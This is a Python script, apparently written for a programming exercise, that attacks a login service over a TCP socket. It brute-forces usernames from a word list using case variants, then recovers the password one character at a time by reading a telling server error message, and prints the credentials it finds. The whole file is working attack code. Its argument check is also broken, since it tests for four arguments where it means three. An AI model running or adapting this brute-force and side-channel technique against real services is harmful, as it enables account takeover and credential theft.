import sys
import socket
import itertools
import os
import json
import string


def gen_login(words):
    for word in words:
        dane = [char if char.isdigit() else (char, char.swapcase()) for char in word]
        spr = itertools.product(*dane)
        for char in spr:
            yield "".join(char)


def json_serialization(log, passwd=' '):
    login_dict = {
        'login': log,
        'password': passwd
    }
    return json.dumps(login_dict)


def catching_exception_attack(my_socket, buffer_size=1024):
    response = ''
    password = ''
    chars = string.ascii_letters + string.digits
    file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "logins.txt")
    with open(file_path, 'r') as f:

        login_list = f.read().split()
        login_to_check = gen_login(login_list)
        while response != "Wrong password!":
            login = next(login_to_check)
            my_socket.send(json_serialization(login).encode())

            json_response = my_socket.recv(buffer_size)
            tuple_response = json.loads(json_response.decode())
            response = tuple_response["result"]
        while len(password) != 7:
            for letter in chars:
                gen_password = password + letter
                my_socket.send(json_serialization(login, gen_password).encode())

                json_response = my_socket.recv(buffer_size)
                tuple_response = json.loads(json_response.decode())
                response = tuple_response["result"]

                if response == "Exception happened during login":
                    password += letter
                    break
                elif response == "Connection success!":
                    password += letter
                    print(json_serialization(login, password))
                    return True
    return False


def main():
    args = sys.argv
    
    if len(args) == 4:
        print('You should pass 2 arguments: <IP address> <port>')
        sys.exit(1)

    ip_address = args[1]
    port = int(args[2])
    with socket.socket() as my_socket:
        address = (ip_address, port)
        my_socket.connect(address)
        catching_exception_attack(my_socket)


if __name__ == '__main__':
    main()
